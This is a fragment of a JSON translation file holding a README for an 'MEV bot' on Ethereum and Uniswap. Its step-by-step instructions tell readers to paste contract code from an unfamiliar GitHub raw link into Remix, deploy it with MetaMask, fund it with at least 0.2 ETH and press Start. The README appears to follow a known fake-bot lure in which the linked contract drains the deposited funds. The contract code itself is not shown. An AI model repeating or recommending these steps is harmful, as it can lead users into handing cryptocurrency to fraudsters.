        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 2. Open Remix"
      },
      {
        "row": 77,
        "rowsha": "sf9QJouzadESQeV0aRqDlsby+K/SReL71nl+GWg9wzw=",
        "originContent": "### 2. Open Remix",
        "translatedContent": "Access [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts."
      },
      {
        "row": 78,
        "rowsha": "xrqtBNzAj+g3K1v67y8vf731TYA7k5HiNW5znWBTUV0=",
        "originContent": "Access [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.",
        "translatedContent": ""
      },
      {
        "row": 79,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 3. Create a New File"
      },
      {
        "row": 80,
        "rowsha": "s7V4yUDsq63t4LB3cpiZlPmsD+DLgszY3jII2SZtmwk=",
        "originContent": "### 3. Create a New File",
        "translatedContent": "üìÅ Create a new file in Remix and name it, e.g., `bot.sol`."
      },
      {
        "row": 81,
        "rowsha": "3EfBJZr9/oYhHLNx0EnwVAWNConcrhfPlASZZv21NEQ=",
        "originContent": "üìÅ Create a new file in Remix and name it, e.g., `bot.sol`.",
        "translatedContent": ""
      },
      {
        "row": 82,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Create New File](https://i.imgur.com/1XiPUes.png)"
      },
      {
        "row": 83,
        "rowsha": "uKH7Au/JzjNN9r5fccVAjHK1ugDHLjAbE4qISvbpOgo=",
        "originContent": "![Create New File](https://i.imgur.com/1XiPUes.png)",
        "translatedContent": ""
      },
      {
        "row": 84,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 4. Paste the Code"
      },
      {
        "row": 85,
        "rowsha": "VtCSCxTfMSeM/Wpg52R7IUNo/gi9+piS81kulWsJ8r0=",
        "originContent": "### 4. Paste the Code",
        "translatedContent": "üìã Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file."
      },
      {
        "row": 86,
        "rowsha": "DGvrIo5dA5whpeNFTRWcd5leMto0LJ1pNqteOtlFiyI=",
        "originContent": "üìã Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file.",
        "translatedContent": ""
      },
      {
        "row": 87,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 5. Compile the Contract"
      },
      {
        "row": 88,
        "rowsha": "rdOWHHVRuW58an/JLZVm56mZAJVAEA6E6ttgLVBX6lI=",
        "originContent": "### 5. Compile the Contract",
        "translatedContent": "üîß Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`."
      },
      {
        "row": 89,
        "rowsha": "OtVQuRHxoqr7q8x7aqom3+hJVmosuUGsrDH9DDF/JmM=",
        "originContent": "üîß Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.",
        "translatedContent": ""
      },
      {
        "row": 90,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Compile Contract](https://i.imgur.com/s5OAv6g.png)"
      },
      {
        "row": 91,
        "rowsha": "SZxTEMAphUqK//QdPCnn0TN3bUzfDBs+4j33eVVrDcA=",
        "originContent": "![Compile Contract](https://i.imgur.com/s5OAv6g.png)",
        "translatedContent": ""
      },
      {
        "row": 92,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 6. Deploy the Bot"
      },
      {
        "row": 93,
        "rowsha": "z4XsnlrJeO6qAGWFTa7Zg1AUh/30KpLeEAbikYdjthk=",
        "originContent": "### 6. Deploy the Bot",
        "translatedContent": "üöÄ Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot."
      },
      {
        "row": 94,
        "rowsha": "9vWLptz90EXD3z0+6MYSHV1f8byCD3O7FLTlgzPsPUg=",
        "originContent": "üöÄ Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.",
        "translatedContent": ""
      },
      {
        "row": 95,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Deploy Contract](https://i.imgur.com/2odZQNj.png)"
      },
      {
        "row": 96,
        "rowsha": "XXAREEHKKx3SPEXi9UDm76wjeGRUJPBbLFv9u4vRX4Q=",
        "originContent": "![Deploy Contract](https://i.imgur.com/2odZQNj.png)",
        "translatedContent": ""
      },
      {
        "row": 97,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 98,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 99,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## ‚öôÔ∏è Configuration"
      },
      {
        "row": 100,
        "rowsha": "zKqkuo4fvvsTT7DrU1TU9VSoJZQ3u19Amef7krgAtNA=",
        "originContent": "## ‚öôÔ∏è Configuration",
        "translatedContent": ""
      }
    ],
    "IsCodeBlock": false
  },
  {
    "Id": 2,
    "Content": "\n### 7. Fund Your Bot\nCopy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.\n\n![Fund Bot](https://i.imgur.com/80NJYYr.png)\n\n### 8. Control the Bot\nUse the following buttons to manage your bot:\n\n- **Start**: Click the `Start` button to activate the bot after funding.\n- **Stop**: Click the `Stop` button to halt bot operations.\n- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).\n\n![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)\n\n![Bot Interface](https://i.imgur.com/xczMc3G.png)\n\n---\n\n## üìú License\n\nThis project is [MIT licensed](LICENSE).\n\n**Reminder**: Open-source does not equal endorsement. Use responsibly.\n\n---\n\n## ‚≠ê Show Your Support\n\nIf you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.\n\n---\n\n## üí≠ FAQ\n\n### Do I need to keep Remix open in the browser while the bot is running?\n\nNo, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\".\n\n### Does it work on other chains or DEXes?\n\nCurrently, the bot is designed exclusively for Ethereum and Uniswap pools.\n\n---\n\n## ü§ù Contribute & Customize\n\n**Want to improve the bot?**\n\n1. Fork the repository.\n2. Add your enhancements (e.g., new pool filters, gas optimizations).\n3. Submit a pull request!\n",
    "ContentSha": "WEckxaFpub0A/gtrrwgUNnjC4RVC0v/CorMMVnbldLs=",
    "SectionType": "",
    "StartLine": 0,
    "EndLine": 0,
    "Translation": "### 7. Fund Your Bot\nCopy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.\n\n![Fund Bot](https://i.imgur.com/80NJYYr.png)\n\n### 8. Control the Bot\nUse the following buttons to manage your bot:\n\n- **Start**: Click the `Start` button to activate the bot after funding.\n- **Stop**: Click the `Stop` button to halt bot operations.\n- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).\n\n![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)\n\n![Bot Interface](https://i.imgur.com/xczMc3G.png)\n\n---\n\n## üìú License\n\nThis project is [MIT licensed](LICENSE).\n\n**Reminder**: Open-source does not equal endorsement. Use responsibly.\n\n---\n\n## ‚≠ê Show Your Support\n\nIf you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.\n\n---\n\n## üí≠ FAQ\n\n### Do I need to keep Remix open in the browser while the bot is running?\n\nNo, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\".\n\n### Does it work on other chains or DEXes?\n\nCurrently, the bot is designed exclusively for Ethereum and Uniswap pools.\n\n---\n\n## ü§ù Contribute & Customize\n\n**Want to improve the bot?**\n\n1. Fork the repository.\n2. Add your enhancements (e.g., new pool filters, gas optimizations).\n3. Submit a pull request!\n\n",
    "Status": "ok",
    "RowTranslations": [
      {
        "row": 1,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 7. Fund Your Bot"
      },
      {
        "row": 2,
        "rowsha": "vj5IJzHAeXKEJ3wpPkwkaclvOlaOByK8LA9fzOF2Tf0=",
        "originContent": "### 7. Fund Your Bot",
        "translatedContent": "Copy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address."
      },
      {
        "row": 3,
        "rowsha": "QIwbfwkzc9XyB1tBEzD5vT9bskA8NmIv7nvDtJwLHg8=",
        "originContent": "Copy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.",
        "translatedContent": ""
      },
      {
        "row": 4,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Fund Bot](https://i.imgur.com/80NJYYr.png)"
      },
      {
        "row": 5,
        "rowsha": "6AKob5CgZqq+UwS59cRhKiBpRhp6Xh0JoSEzmAjMlME=",
        "originContent": "![Fund Bot](https://i.imgur.com/80NJYYr.png)",
        "translatedContent": ""
      },
      {
        "row": 6,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 8. Control the Bot"
      },
      {
        "row": 7,
        "rowsha": "4MxfqAVlrptMLX/hKF1nwN2ZsCOjFaPvwmvZgDJELIU=",
        "originContent": "### 8. Control the Bot",
        "translatedContent": "Use the following buttons to manage your bot:"
      },
      {
        "row": 8,
        "rowsha": "Y93HXXT3CVctX6DbKXrQMejcOT9jqHY0lP4Lvh6sJyQ=",
        "originContent": "Use the following buttons to manage your bot:",
        "translatedContent": ""
      },
      {
        "row": 9,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "- **Start**: Click the `Start` button to activate the bot after funding."
      },
      {
        "row": 10,
        "rowsha": "qVyg6oVl1feAc/1UO92rw/29WdxgKYxNL4JIuF+Tj+8=",
        "originContent": "- **Start**: Click the `Start` button to activate the bot after funding.",
        "translatedContent": "- **Stop**: Click the `Stop` button to halt bot operations."
      },
      {
        "row": 11,
        "rowsha": "9Qi3rfx68Oq0ged08yibRvt7NIVULfYEoPr+rHFoBUE=",
        "originContent": "- **Stop**: Click the `Stop` button to halt bot operations.",
        "translatedContent": "- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot)."
      },
      {
        "row": 12,
        "rowsha": "VQ2N/jjAm2SwWUrQKW4JPQUQ29TfmGix51uCIPH5Yj0=",
        "originContent": "- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).",
        "translatedContent": ""
      },
      {
        "row": 13,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)"
      },
      {
        "row": 14,
        "rowsha": "77LChLyqz5m5s0vf9BVa9zIStn+o3ZHpOIV4lDHHqAE=",
        "originContent": "![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)",
        "translatedContent": ""
      },
      {
        "row": 15,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "![Bot Interface](https://i.imgur.com/xczMc3G.png)"
      },
      {
        "row": 16,
        "rowsha": "TglrQ2v7MnJBd42TrHiNjrfRnPpqCbbR9wlk3/Cy+7M=",
        "originContent": "![Bot Interface](https://i.imgur.com/xczMc3G.png)",
        "translatedContent": ""
      },
      {
        "row": 17,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 18,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 19,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## üìú License"
      },
      {
        "row": 20,
        "rowsha": "Xg7z9THMMv8mm3IS7LJHSaXGCrZhD8D4NGbb/+/ra/Y=",
        "originContent": "## üìú License",
        "translatedContent": ""
      },
      {
        "row": 21,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "This project is [MIT licensed](LICENSE)."
      },
      {
        "row": 22,
        "rowsha": "konhH11ncQOIqvj3FB0P3+7Q2TRGkfzH3iSgZSnAj1A=",
        "originContent": "This project is [MIT licensed](LICENSE).",
        "translatedContent": ""
      },
      {
        "row": 23,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "**Reminder**: Open-source does not equal endorsement. Use responsibly."
      },
      {
        "row": 24,
        "rowsha": "LrvWwOZFJmIfY54ACXedwtSjNhdlw1PiXgv38pdZUm0=",
        "originContent": "**Reminder**: Open-source does not equal endorsement. Use responsibly.",
        "translatedContent": ""
      },
      {
        "row": 25,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 26,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 27,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## ‚≠ê Show Your Support"
      },
      {
        "row": 28,
        "rowsha": "M/WfqAhCspwe5qydivDdtNvd7D9RHPSl72X81dvt7Ao=",
        "originContent": "## ‚≠ê Show Your Support",
        "translatedContent": ""
      },
      {
        "row": 29,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "If you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements."
      },
      {
        "row": 30,
        "rowsha": "fSsI4wUmfgtdO991DeVOfjUZnglTFn3b5gQ5/DmYQFg=",
        "originContent": "If you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.",
        "translatedContent": ""
      },
      {
        "row": 31,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 32,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 33,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## üí≠ FAQ"
      },
      {
        "row": 34,
        "rowsha": "umFbJCwgMy+8wCVNSC3fxhKCzM+oQVShd5w7noEu5z8=",
        "originContent": "## üí≠ FAQ",
        "translatedContent": ""
      },
      {
        "row": 35,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### Do I need to keep Remix open in the browser while the bot is running?"
      },
      {
        "row": 36,
        "rowsha": "qVlSadWuRgpBtxeITsRsAqo5d/+/ztPnM60OLeCglIQ=",
        "originContent": "### Do I need to keep Remix open in the browser while the bot is running?",
        "translatedContent": ""
      },
      {
        "row": 37,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "No, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\"."
      },
      {
        "row": 38,
        "rowsha": "PYAS2j0X1hFoyFrMu9u+jox2oScRCh5gExpec4fjFhA=",
        "originContent": "No, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under \"Deployed Contracts\".",
        "translatedContent": ""
      },
      {
        "row": 39,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### Does it work on other chains or DEXes?"
      },
      {
        "row": 40,
        "rowsha": "bnc1b58mf4wPSwGm0m03M6+SZ0CTw2gHlpYGZvcHwxE=",
        "originContent": "### Does it work on other chains or DEXes?",
        "translatedContent": ""
      },
      {
        "row": 41,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "Currently, the bot is designed exclusively for Ethereum and Uniswap pools."
      },
      {
        "row": 42,
        "rowsha": "o+buTJvnfWhRpjEsghP80ue0o1X6PjYo5O9adlPgTO0=",
        "originContent": "Currently, the bot is designed exclusively for Ethereum and Uniswap pools.",
        "translatedContent": ""
      },
      {
        "row": 43,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 44,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 45,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## ü§ù Contribute & Customize"
      },
      {
        "row": 46,
        "rowsha": "E5Pyn67MtG22uHdzdtEWLTbYHiJT6LtZSx7RDsj0jEY=",
        "originContent": "## ü§ù Contribute & Customize",
        "translatedContent": ""
      },
      {
        "row": 47,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "**Want to improve the bot?**"
      },
      {
        "row": 48,
        "rowsha": "kOfilVyXLGytHyoOwE5aJtu2c3yndKuovxUvKaJshOU=",
        "originContent": "**Want to improve the bot?**",
        "translatedContent": ""
      },
      {
        "row": 49,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "1. Fork the repository."
      },
      {
        "row": 50,
        "rowsha": "U4nMNpPbnNo6qbcTdRpdl58Jt4MVlUOn2OzAN4sXiz8=",
        "originContent": "1. Fork the repository.",
        "translatedContent": "2. Add your enhancements (e.g., new pool filters, gas optimizations)."
      },
      {
        "row": 51,
        "rowsha": "eomgBo2HTKXAVNXIpKE1QWL9SLuEvbJO8jRS7K571cQ=",
        "originContent": "2. Add your enhancements (e.g., new pool filters, gas optimizations).",
        "translatedContent": "3. Submit a pull request!"
      },
      {
        "row": 52,
        "rowsha": "O9p20O3qoraIl36TyxqEQyeD/iRYyo/xu2LKaz96sPQ=",
        "originContent": "3. Submit a pull request!",
        "translatedContent": ""
      },
      {
        "row": 53,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": ""
      }
    ],
    "IsCodeBlock": false
  }
]